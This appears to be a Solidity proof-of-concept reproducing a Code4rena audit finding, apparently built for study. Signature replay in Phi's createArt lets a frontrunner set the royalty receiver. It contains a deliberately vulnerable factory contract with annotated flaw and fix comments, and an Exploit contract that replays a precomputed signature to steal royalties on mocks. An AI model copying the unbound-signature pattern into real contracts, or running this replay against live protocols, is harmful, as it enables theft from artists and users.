// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Phi -- Signature replay in createArt allows impersonating the artist
    (Code4rena 2024-08-phi, finding #41088, H-02, reporter petarP1998)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    PhiFactory.createArt(signedData_, signature_, config_) verifies a
    signature over (expiresIn_, uri_, credHash_) only -- the CreateConfig
    (artist/receiver/royaltyBPS) is NEVER covered by the signature, and the
    caller is never bound either. createERC1155Internal() also succeeds
    (does not revert) whether it deploys a NEW art contract or one already
    exists for the uri -- so whoever's transaction lands FIRST permanently
    sets the config, and the legitimate submitter's later, correctly-signed
    transaction is silently ignored while still "succeeding".
//////////////////////////////////////////////////////////////////////////*/

contract MockRewardToken {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev Minimal stand-in for a deployed PhiNFT1155 art contract -- only its
///      existence/address matters for this reduction.
contract MockPhiNFT1155 {}

/// @notice Reduced PhiFactory -- faithful reduction of src/PhiFactory.sol#L196-L213
///         and createERC1155Internal (src/PhiFactory.sol#L551-L568).
contract PhiFactory2 {
    struct CreateConfig {
        address artist;
        address receiver;
        uint256 royaltyBPS;
    }

    address public immutable phiSignerAddress;
    MockRewardToken public immutable rewardToken;
    uint256 public constant ROYALTY_REWARD = 100; // protocol-funded royalty payout per claim

    mapping(bytes32 => address) public artByUriHash;
    mapping(address => CreateConfig) public artData;

    constructor(address signer_, MockRewardToken rewardToken_) {
        phiSignerAddress = signer_;
        rewardToken = rewardToken_;
    }

    function _recoverSigner(bytes32 hash_, bytes memory signature_) internal pure returns (address) {
        bytes32 ethSigned = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", hash_));
        require(signature_.length == 65, "bad sig len");
        bytes32 r;
        bytes32 s;
        uint8 v;
        assembly {
            r := mload(add(signature_, 32))
            s := mload(add(signature_, 64))
            v := byte(0, mload(add(signature_, 96)))
        }
        return ecrecover(ethSigned, v, r, s);
    }

    /// @dev Faithful reduction of PhiFactory.createArt (src/PhiFactory.sol#L196-L213).
    function createArt(
        bytes calldata signedData_,
        bytes calldata signature_,
        CreateConfig memory config_
    )
        external
        returns (address artAddr)
    {
        (uint256 expiresIn_, string memory uri_, bytes32 credHash_) =
            abi.decode(signedData_, (uint256, string, bytes32));

        if (expiresIn_ <= block.timestamp) revert("SignatureExpired");
        if (_recoverSigner(keccak256(signedData_), signature_) != phiSignerAddress) revert("AddressNotSigned");

        // @> VULN: the signed payload covers only (expiresIn_, uri_, credHash_) -- it never
        // binds config_ (artist/receiver/royaltyBPS), nor does it bind the caller. Anyone who
        // observes a valid createArt tx in the mempool can reuse signedData_/signature_ with
        // their OWN config_.
        // FIX: include config_ in the signed payload (e.g. a nonce/creator/executor scheme),
        // and/or restrict execution to a specific submitter.
        return createERC1155Internal(uri_, config_);
    }

    function createERC1155Internal(string memory uri_, CreateConfig memory config_) internal returns (address artAddr) {
        bytes32 key = keccak256(bytes(uri_));
        artAddr = artByUriHash[key];
        if (artAddr == address(0)) {
            artAddr = address(new MockPhiNFT1155());
            artByUriHash[key] = artAddr;
            artData[artAddr] = config_;
        }
        // @> VULN2: whether a NEW contract is created above, or artAddr ALREADY EXISTED for
        // this uri_, this function returns successfully either way (no revert) -- so a
        // frontrunning resubmission with a DIFFERENT config_ silently wins the permanent
        // artist/receiver/royaltyBPS slot, and the legitimate submitter's later tx "succeeds"
        // while its config_ is silently discarded.
    }

    function claimRoyalty(address artAddr) external {
        CreateConfig memory d = artData[artAddr];
        rewardToken.transfer(d.receiver, ROYALTY_REWARD);
    }
}

contract Exploit {
    MockRewardToken public rewardToken; // CREATE nonce 1
    PhiFactory2 public factory; // CREATE nonce 2

    address public constant ARTIST = address(0xA11CE0);
    address public constant ATTACKER = address(0xBAD1);
    address public constant LEGIT_RECEIVER = address(0xF00D);

    // Precomputed OFFLINE (private key 0xA11CE, signer 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7)
    // -- no cheatcodes in this file. signedData_ = abi.encode(
    //   expiresIn=2_000_000_000, uri="sample-art-id", credHash=keccak256("SIGNATURE"))
    bytes constant SIGNED_DATA =
        hex"000000000000000000000000000000000000000000000000000000007735940000000000000000000000000000000000000000000000000000000000000000603bc94f020ffea26f68f6c97ba4adace4972b105480ed4a78141967040a183acc000000000000000000000000000000000000000000000000000000000000000d73616d706c652d6172742d696400000000000000000000000000000000000000";
    bytes32 constant R = 0xe9f5b0b8714224f44fad5930802ace6a5f5f01fda40a389c328d97880781b160;
    bytes32 constant S = 0x509d98fdbc5d6969ab6618080025bf394830446015109b46f530e95311fe6f02;
    uint8 constant V = 27;
    address constant SIGNER = 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7;

    constructor() {
        rewardToken = new MockRewardToken();
        factory = new PhiFactory2(SIGNER, rewardToken);
        rewardToken.mint(address(factory), 1000); // protocol royalty pool
    }

    function run() external {
        bytes memory sig = abi.encodePacked(R, S, V);

        PhiFactory2.CreateConfig memory attackerConfig =
            PhiFactory2.CreateConfig({ artist: ARTIST, receiver: ATTACKER, royaltyBPS: 500 });
        PhiFactory2.CreateConfig memory legitConfig =
            PhiFactory2.CreateConfig({ artist: ARTIST, receiver: LEGIT_RECEIVER, royaltyBPS: 500 });

        // === attack: attacker observes the legitimate createArt in the mempool and frontruns
        // it, reusing the SAME signedData_/signature_ but with THEIR OWN config_ ===
        address artAddr = factory.createArt(SIGNED_DATA, sig, attackerConfig);

        // The legitimate owner's tx lands afterward with the CORRECT config_; it "succeeds"
        // (does not revert) -- but is silently ignored because the art contract already exists.
        address artAddr2 = factory.createArt(SIGNED_DATA, sig, legitConfig);
        require(artAddr == artAddr2, "sanity: same art contract for both calls");

        // HARM: the permanent receiver slot is the ATTACKER's, not the legitimate artist's
        // chosen receiver -- royalties are now stolen at every future claim.
        (, address receiver,) = factory.artData(artAddr);
        require(receiver == ATTACKER, "attacker did not capture the receiver slot");

        uint256 attackerBefore = rewardToken.balanceOf(ATTACKER);
        factory.claimRoyalty(artAddr);
        require(rewardToken.balanceOf(ATTACKER) == attackerBefore + factory.ROYALTY_REWARD(), "royalty not stolen");
        require(rewardToken.balanceOf(LEGIT_RECEIVER) == 0, "legit receiver should get nothing");
    }
}
